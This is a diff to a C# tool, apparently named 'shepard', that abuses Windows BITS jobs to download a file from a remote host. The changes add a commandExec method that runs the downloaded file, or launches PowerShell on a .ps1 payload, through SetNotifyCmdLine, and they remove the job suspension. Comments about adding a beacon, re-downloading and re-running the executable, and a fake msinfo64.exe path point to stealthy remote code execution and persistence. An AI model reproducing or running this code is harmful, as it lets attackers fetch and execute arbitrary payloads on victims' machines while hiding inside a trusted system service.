@@ -8,6 +8,7 @@ using BITS = BITSReference1_5;
 
 //add a beacon function somewhere in main ^
 //redownload this executable and run again using bits, different job
+//C:\Program Files\Common Files\microsoft shared\MSInfo\msinfo64.exe
 namespace shepard
 {
     class JobObj
@@ -116,16 +117,30 @@ namespace shepard
             jo.downloadFile(name, remote, filePath); //initial download, completes
 
             mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
-            var job2 = job as BITS.IBackgroundCopyJob2;
+            
             job.AddFile(remote, filePath);
-            //job2.SetNotifyCmdLine(filePath, cmdArgs); //runs the file through CMD with params
-            //job2.SetNotifyCmdLine("C:\\Windows\\System32\\calc.exe", ""); //runs the file through CMD with params
+            jo.commandExec(job, filePath, cmdArgs);
             job.SetMinimumRetryDelay(10);
             
             job.Resume();
             System.Threading.Thread.Sleep(1000);
-            job.Suspend();
+            //job.Suspend();
+        }
 
+        private void commandExec(BITS.IBackgroundCopyJob job, string filename, string args)
+        {
+            string filepath;
+            var job2 = job as BITS.IBackgroundCopyJob2;
+            if (filename.Contains(".ps1"))
+            {
+                args = filename;
+                filepath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+            }else
+            {
+                filepath = filename;
+            }
+            Console.WriteLine(filepath+args);
+            job2.SetNotifyCmdLine(filepath, args);
         }
 
         
